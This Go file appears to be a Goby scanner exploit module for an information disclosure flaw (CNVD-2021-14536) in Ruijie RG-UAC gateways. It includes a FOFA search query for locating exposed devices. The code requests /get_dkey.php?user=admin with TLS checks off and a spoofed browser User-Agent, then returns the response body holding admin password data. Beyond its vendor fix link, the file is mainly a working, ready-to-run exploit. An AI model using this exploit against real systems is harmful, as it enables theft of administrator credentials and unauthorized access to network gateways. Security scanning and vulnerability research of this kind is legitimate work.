package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Ruijie RG-UAC get_dkey.php file Information Disclosure ",
    "Description": "<p>Ruijie RG-UAC series application management gateways are application management products independently developed by Ruijie. They are deployed on key nodes of the network in routing, transparent, bypass or hybrid mode, and perform comprehensive inspection and analysis of data at layers 2-7. Statistical analysis is performed on the logs to form a variety of data reports, which clearly and detailedly present the application management situation.</p><p>Statistical analysis is performed on the logs to form a variety of data reports, which clearly and detailedly present the application management situation.</p>",
    "Impact": "<p>Ruijie RG-UAC Information Disclosure CNVD-2021-14536</p>",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"http://www.ruijie.com.cn/gy/xw-aqtg-zw/86924/\">http://www.ruijie.com.cn/gy/xw-aqtg-zw/86924/</a></p>",
    "Product": "Ruijie RG-UAC",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "锐捷 RG-UAC get_dkey.php 文件信息泄露漏洞",
            "Product": "锐捷RG-UAC统一上网行为管理审计系统",
            "Description": "<p>锐捷RG-UAC系列应用管理网关是锐捷自主研发的应用管理产品，以路由、透明、旁路或混合模式部署在网络的关键节点上，对数据进行2-7层的全面检查和分析，并对日志进行统计分析，形成多种多样的数据报表，清晰、详细的呈现应用管理情况。</p><p>锐捷RG-UAC统一上网行为管理审计系统存在信息泄露漏洞。攻击者可利用漏洞获取敏感信息。</p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新：<span style=\"color: var(--primaryFont-color);\"><a href=\"http://www.ruijie.com.cn/gy/xw-aqtg-zw/86924/\">http://www.ruijie.com.cn/gy/xw-aqtg-zw/86924/</a></span></p>",
            "Impact": "<p>锐捷RG-UAC统一上网行为管理审计系统存在信息泄露漏洞，攻击者可通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Ruijie RG-UAC get_dkey.php file Information Disclosure ",
            "Product": "Ruijie RG-UAC",
            "Description": "<p>Ruijie RG-UAC series application management gateways are application management products independently developed by Ruijie. They are deployed on key nodes of the network in routing, transparent, bypass or hybrid mode, and perform comprehensive inspection and analysis of data at layers 2-7. Statistical analysis is performed on the logs to form a variety of data reports, which clearly and detailedly present the application management situation.</p><p>Statistical analysis is performed on the logs to form a variety of data reports, which clearly and detailedly present the application management situation.</p>",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"http://www.ruijie.com.cn/gy/xw-aqtg-zw/86924/\">http://www.ruijie.com.cn/gy/xw-aqtg-zw/86924/</a></p>",
            "Impact": "<p>Ruijie RG-UAC Information Disclosure CNVD-2021-14536</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"RG-UAC登录页面\"",
    "GobyQuery": "body=\"RG-UAC登录页面\"",
    "Author": "AnM1ng",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2022-01-20",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-14536",
        "https://github.com/hhroot/2021_Hvv/commit/d83e05b433ff1545d7cbb21a9b4d9a7d9bfcdfc8",
        "https://blog.csdn.net/weixin_45291045/article/details/114734172",
        "https://blog.csdn.net/Adminxe/article/details/114584215"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-14536"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "select",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10252"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/get_dkey.php?user=admin"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				reg := regexp.MustCompile(`"password":"`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/get_dkey.php?user=admin"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				reg := regexp.MustCompile(`password`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
